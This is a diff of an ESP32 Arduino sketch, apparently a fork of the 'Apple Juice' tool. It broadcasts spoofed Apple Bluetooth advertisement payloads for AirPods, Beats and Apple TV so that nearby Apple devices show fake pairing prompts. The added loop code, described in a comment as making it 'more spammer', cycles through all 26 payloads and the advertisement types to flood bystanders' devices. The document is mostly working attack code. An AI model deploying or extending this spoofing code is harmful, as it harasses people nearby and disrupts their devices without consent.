@@ -1,6 +1,7 @@
 // ESP32 Arduino implementation of Apple Juice
-// Author: Ronald Stoner 
+// Author: Ronald Stoner
 // Github: https://github.com/ronaldstoner
+// Modificado para que sea mas spammer
 
 // Based on the previous work of chipik / _hexway / ECTO-1A & SAY-10
 
@@ -11,14 +12,14 @@
 BLEAdvertising *pAdvertising;  // global variable
 
 // User selectable variables
-int deviceType = 4; // 1 for Airpods, 2 for Airpods Pro, 3 for Airpods Max, 4 for...
+int deviceType = 1; // 1 for Airpods, 2 for Airpods Pro, 3 for Airpods Max, 4 for...
 int delaySeconds = 2; // delay in seconds
-int advType = 2; 
-  // 0 - ADV_TYPE_IND
-  // 1 - ADV_TYPE_DIRECT_IND_HIGH (directed advertisement with high duty cycle)
-  // 2 - ADV_TYPE_SCAN_IND
-  // 3 - ADV_NONCONN_IND
-  // 4 - ADV_TYPE_DIRECT_IND_LOW (directed advertisement with low duty cycle)
+int advType = 2;
+// 0 - ADV_TYPE_IND
+// 1 - ADV_TYPE_DIRECT_IND_HIGH (directed advertisement with high duty cycle)
+// 2 - ADV_TYPE_SCAN_IND
+// 3 - ADV_NONCONN_IND
+// 4 - ADV_TYPE_DIRECT_IND_LOW (directed advertisement with low duty cycle)
 
 void setup() {
   Serial.begin(115200);
@@ -34,7 +35,7 @@ void setup() {
 
   // Payload data
   uint8_t dataAirpods[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-  
+
   uint8_t dataAirpodsPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
   uint8_t dataAirpodsMax[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
   uint8_t dataAirpodsGen2[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
@@ -44,7 +45,7 @@ void setup() {
   uint8_t dataPowerBeatsPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
   uint8_t dataBeatsSoloPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
   uint8_t dataBeatsStudioBuds[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-  uint8_t dataBeatsFlex[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; 
+  uint8_t dataBeatsFlex[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
   uint8_t dataBeatsX[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
   uint8_t dataBeatsSolo3[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
   uint8_t dataBeatsStudio3[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
@@ -64,96 +65,96 @@ void setup() {
   uint8_t dataTransferNumber[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x02, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
   uint8_t dataTVColorBalance[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x1e, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
 
-// Select the appropriate data based on the device type
-uint8_t* data;
-switch(deviceType) {
-  case 1:
-    data = dataAirpods;
-    break;
-  case 2:
-    data = dataAirpodsPro;
-    break;
-  case 3:
-    data = dataAirpodsMax;
-    break;
-  case 4:
-    data = dataAirpodsGen2;
-    break;
-  case 5:
-    data = dataAirpodsGen3;
-    break;
-  case 6:
-    data = dataAirpodsProGen2;
-    break;
-  case 7:
-    data = dataPowerBeats;
-    break;
-  case 8:
-    data = dataPowerBeatsPro;
-    break;
-  case 9:
-    data = dataBeatsSoloPro;
-    break;
-  case 10:
-    data = dataBeatsStudioBuds;
-    break;
-  case 11:
-    data = dataBeatsFlex;
-    break;
-  case 12:
-    data = dataBeatsX;
-    break;
-  case 13:
-    data = dataBeatsSolo3;
-    break;
-  case 14:
-    data = dataBeatsStudio3;
-    break;
-  case 15:
-    data = dataBeatsStudioPro;
-    break;
-  case 16:
-    data = dataBeatsFitPro;
-    break;
-  case 17:
-    data = dataBeatsStudioBudsPlus;
-    break;
-  case 18:
-    data = dataAppleTVSetup;
-    break;
-  case 19:
-    data = dataAppleTVPair;
-    break;
-  case 20:
-    data = dataAppleTVNewUser;
-    break;
-  case 21:
-    data = dataAppleTVAppleIDSetup;
-    break;
-  case 22:
-    data = dataAppleTVWirelessAudioSync;
-    break;
-  case 23:
-    data = dataAppleTVHomekitSetup;
-    break;
-  case 24:
-    data = dataAppleTVKeyboard;
-    break;
-  case 25:
-    data = dataAppleTVConnectingToNetwork;
-    break;
-  case 26:
-    data = dataTVColorBalance;
-    break;
-  default:
-    data = dataAirpods; // default to dataAirpods if no valid deviceType is provided
-    break;
-}
+  // Select the appropriate data based on the device type
+  uint8_t* data;
+  switch (deviceType) {
+    case 1:
+      data = dataAirpods;
+      break;
+    case 2:
+      data = dataAirpodsPro;
+      break;
+    case 3:
+      data = dataAirpodsMax;
+      break;
+    case 4:
+      data = dataAirpodsGen2;
+      break;
+    case 5:
+      data = dataAirpodsGen3;
+      break;
+    case 6:
+      data = dataAirpodsProGen2;
+      break;
+    case 7:
+      data = dataPowerBeats;
+      break;
+    case 8:
+      data = dataPowerBeatsPro;
+      break;
+    case 9:
+      data = dataBeatsSoloPro;
+      break;
+    case 10:
+      data = dataBeatsStudioBuds;
+      break;
+    case 11:
+      data = dataBeatsFlex;
+      break;
+    case 12:
+      data = dataBeatsX;
+      break;
+    case 13:
+      data = dataBeatsSolo3;
+      break;
+    case 14:
+      data = dataBeatsStudio3;
+      break;
+    case 15:
+      data = dataBeatsStudioPro;
+      break;
+    case 16:
+      data = dataBeatsFitPro;
+      break;
+    case 17:
+      data = dataBeatsStudioBudsPlus;
+      break;
+    case 18:
+      data = dataAppleTVSetup;
+      break;
+    case 19:
+      data = dataAppleTVPair;
+      break;
+    case 20:
+      data = dataAppleTVNewUser;
+      break;
+    case 21:
+      data = dataAppleTVAppleIDSetup;
+      break;
+    case 22:
+      data = dataAppleTVWirelessAudioSync;
+      break;
+    case 23:
+      data = dataAppleTVHomekitSetup;
+      break;
+    case 24:
+      data = dataAppleTVKeyboard;
+      break;
+    case 25:
+      data = dataAppleTVConnectingToNetwork;
+      break;
+    case 26:
+      data = dataTVColorBalance;
+      break;
+    default:
+      data = dataAirpods; // default to dataAirpods if no valid deviceType is provided
+      break;
+  }
   // This flag does not seem to be needed for ESP32 BLE
   //oAdvertisementData.setFlags(0x03);
 
   // Set the advertisement data type
-  switch(advType) {
+  switch (advType) {
     case 0:
       pAdvertising->setAdvertisementType(ADV_TYPE_IND);
       break;
@@ -170,7 +171,7 @@ switch(deviceType) {
       pAdvertising->setAdvertisementType(ADV_TYPE_DIRECT_IND_LOW);
       break;
   }
-  
+
 
   // Set up the advertisement data
   oAdvertisementData.addData(std::string((char*)data, sizeof(dataAirpods)));
@@ -179,8 +180,19 @@ switch(deviceType) {
 
 void loop() {
   // Start advertising
-  Serial.println("Sending Advertisement...");
+  Serial.print("Sending advertisement -> device: ");
+  Serial.print(deviceType);
+  Serial.print(" - advertisement data type: ");
+  Serial.println(advType);
   pAdvertising->start();
   delay(delaySeconds * 1000); // delay for delaySeconds seconds
   pAdvertising->stop();
+  deviceType++;
+  if (deviceType == 27) {
+    deviceType = 1;
+  }
+  advType++;
+  if (advType == 5) {
+    advType = 0;
+  }
 }
